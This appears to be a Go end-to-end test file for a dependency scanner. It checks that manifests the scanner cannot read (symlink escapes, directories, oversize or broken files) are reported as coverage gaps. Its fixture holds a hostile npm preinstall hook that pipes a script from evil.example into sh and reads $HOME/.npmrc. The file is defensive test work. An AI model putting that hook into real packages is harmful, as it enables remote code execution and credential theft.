package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// End-to-end gap accounting (findings R-01 / R-02).
//
// The earlier coverage tests injected a prebuilt graph.Coverage into the verdict
// and asserted the exit code, which proves the POLICY but not the PLUMBING: it
// cannot catch an adapter that swallows a refusal before coverage is ever
// assembled — which is exactly the bug R-01 found. These tests build a real
// hostile checkout on disk, run the real CLI end to end, and assert the process
// exit code and the emitted JSON.
//
// The attack being modelled is the cheap one: an attacker cannot make depsnort
// read outside the scan root (F-03 stops that), so instead they make the
// evidence UNREADABLE. If refusing to read is silent, the install hook simply
// disappears and the scan reports clean.

// runScan invokes the CLI exactly as a shell would and returns exit code + parsed JSON.
func runScan(t *testing.T, args ...string) (int, map[string]any) {
	t.Helper()
	out := filepath.Join(t.TempDir(), "report.json")
	full := append([]string{"scan", "-no-osv", "-no-registry", "-o", out}, args...)
	code := run(full)

	raw, err := os.ReadFile(out)
	if err != nil {
		t.Fatalf("reading report: %v", err)
	}
	var doc map[string]any
	if err := json.Unmarshal(raw, &doc); err != nil {
		t.Fatalf("report is not valid JSON: %v", err)
	}
	return code, doc
}

func coverageOf(t *testing.T, doc map[string]any) map[string]any {
	t.Helper()
	v, ok := doc["verdict"].(map[string]any)
	if !ok {
		t.Fatal("report has no verdict")
	}
	c, ok := v["coverage"].(map[string]any)
	if !ok {
		t.Fatal("verdict has no coverage")
	}
	return c
}

// evilManifestJSON would produce a blocking finding if it were ever read: a
// download cradle plus a named credential file.
const evilManifestJSON = `{"name":"evil","version":"1.0.0","scripts":` +
	`{"preinstall":"curl https://evil.example/p.sh | sh; cat $HOME/.npmrc"}}`

// npmProjectWithPackage writes a lockfile whose root DEPENDS ON the package, so
// the package is never an orphan — isolating the refusal as the only anomaly.
func npmProjectWithPackage(t *testing.T, root string) {
	t.Helper()
	lock := `{"name":"host","version":"1.0.0","lockfileVersion":3,
	 "packages":{"":{"name":"host","version":"1.0.0","dependencies":{"evil":"1.0.0"}},
	 "node_modules/evil":{"version":"1.0.0"}}}`
	if err := os.WriteFile(filepath.Join(root, "package-lock.json"), []byte(lock), 0o644); err != nil {
		t.Fatal(err)
	}
}

func assertGated(t *testing.T, code int, cov map[string]any, wantReason string) {
	t.Helper()
	if code != 3 {
		t.Errorf("exit = %d, want 3 under -fail-on-incomplete", code)
	}
	if complete, _ := cov["complete"].(bool); complete {
		t.Error("coverage.complete = true; an unexamined install surface is not complete coverage")
	}
	gaps, _ := cov["install_surface_gaps"].(float64)
	if gaps < 1 {
		t.Errorf("install_surface_gaps = %v, want >= 1", cov["install_surface_gaps"])
	}
	if wantReason != "" {
		reasons, _ := json.Marshal(cov["install_surface_gap_reasons"])
		if !strings.Contains(string(reasons), wantReason) {
			t.Errorf("gap reasons = %s, want one containing %q", reasons, wantReason)
		}
	}
}

// A package directory symlinked out of the repo: containment refuses, and that
// refusal must gate rather than vanish.
func TestE2E_SymlinkEscapeGatesIncomplete(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "package.json"), []byte(evilManifestJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(root, "node_modules"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "node_modules", "evil")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	npmProjectWithPackage(t, root)

	code, doc := runScan(t, "-fail-on-incomplete", root)
	assertGated(t, code, coverageOf(t, doc), "containment-refusal")
}

// A manifest that is a directory rather than a regular file.
func TestE2E_SpecialFileGatesIncomplete(t *testing.T) {
	root := t.TempDir()
	// node_modules/evil/package.json exists — as a DIRECTORY.
	if err := os.MkdirAll(filepath.Join(root, "node_modules", "evil", "package.json"), 0o755); err != nil {
		t.Fatal(err)
	}
	npmProjectWithPackage(t, root)

	code, doc := runScan(t, "-fail-on-incomplete", root)
	assertGated(t, code, coverageOf(t, doc), "not-a-regular-file")
}

// A manifest too large to read: the payload sits past the cap, so analyzing a
// truncated prefix would be worse than admitting we did not read it.
func TestE2E_OversizeManifestGatesIncomplete(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "node_modules", "evil")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	huge := make([]byte, 17<<20) // over securefs's 16 MiB per-file cap
	for i := range huge {
		huge[i] = ' '
	}
	copy(huge, []byte(evilManifestJSON))
	if err := os.WriteFile(filepath.Join(dir, "package.json"), huge, 0o644); err != nil {
		t.Fatal(err)
	}
	npmProjectWithPackage(t, root)

	code, doc := runScan(t, "-fail-on-incomplete", root)
	assertGated(t, code, coverageOf(t, doc), "file-too-large")
}

// A manifest that exists and is readable but is not valid JSON: read, not
// understood — still material we failed to analyze.
func TestE2E_UnparseableManifestGatesIncomplete(t *testing.T) {
	root := t.TempDir()
	dir := filepath.Join(root, "node_modules", "evil")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte("{not json"), 0o644); err != nil {
		t.Fatal(err)
	}
	npmProjectWithPackage(t, root)

	code, doc := runScan(t, "-fail-on-incomplete", root)
	assertGated(t, code, coverageOf(t, doc), "parse-error")
}

// THE CONTROL, and the reason this cannot just gate on everything: a package
// that is simply not installed (no node_modules, the ordinary pre-install state
// depsnort is designed to scan) must stay complete and exit 0. If absence gated,
// every real pre-install scan would fail and the signal would be worthless.
func TestE2E_AbsentPackageStaysCleanAndComplete(t *testing.T) {
	root := t.TempDir()
	npmProjectWithPackage(t, root) // lockfile only; nothing installed

	code, doc := runScan(t, "-fail-on-incomplete", root)
	cov := coverageOf(t, doc)
	if code != 0 {
		t.Errorf("exit = %d, want 0 — an uninstalled dependency is normal, not a gap", code)
	}
	if complete, _ := cov["complete"].(bool); !complete {
		t.Errorf("coverage.complete = false for an ordinary pre-install tree: %v", cov)
	}
	if gaps, _ := cov["install_surface_gaps"].(float64); gaps != 0 {
		t.Errorf("install_surface_gaps = %v, want 0", cov["install_surface_gaps"])
	}
}

// Gaps are REPORTED unconditionally and GATE only on opt-in — the same
// discipline as every other coverage fact (D-06/D-24).
func TestE2E_GapReportedButDoesNotGateWithoutOptIn(t *testing.T) {
	root := t.TempDir()
	outside := t.TempDir()
	if err := os.WriteFile(filepath.Join(outside, "package.json"), []byte(evilManifestJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(root, "node_modules"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(outside, filepath.Join(root, "node_modules", "evil")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	npmProjectWithPackage(t, root)

	code, doc := runScan(t, root) // no -fail-on-incomplete
	cov := coverageOf(t, doc)
	if code != 0 {
		t.Errorf("exit = %d, want 0 without -fail-on-incomplete", code)
	}
	if gaps, _ := cov["install_surface_gaps"].(float64); gaps < 1 {
		t.Errorf("the gap must still be REPORTED when it does not gate: %v", cov)
	}
	if complete, _ := cov["complete"].(bool); complete {
		t.Error("coverage.complete must be false even when the gap does not gate")
	}
}

// A block-class finding still outranks an incomplete read, end to end.
func TestE2E_BlockOutranksGap(t *testing.T) {
	root := t.TempDir()
	// One package readable and malicious, one refused.
	good := filepath.Join(root, "node_modules", "bad")
	if err := os.MkdirAll(good, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(good, "package.json"), []byte(evilManifestJSON), 0o644); err != nil {
		t.Fatal(err)
	}
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(root, "node_modules", "evil")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	lock := `{"name":"host","version":"1.0.0","lockfileVersion":3,
	 "packages":{"":{"name":"host","version":"1.0.0","dependencies":{"evil":"1.0.0","bad":"1.0.0"}},
	 "node_modules/evil":{"version":"1.0.0"},"node_modules/bad":{"version":"1.0.0"}}}`
	if err := os.WriteFile(filepath.Join(root, "package-lock.json"), []byte(lock), 0o644); err != nil {
		t.Fatal(err)
	}

	code, _ := runScan(t, "-fail-on-incomplete", root)
	if code != 1 {
		t.Errorf("exit = %d, want 1 — a block outranks incomplete coverage", code)
	}
}
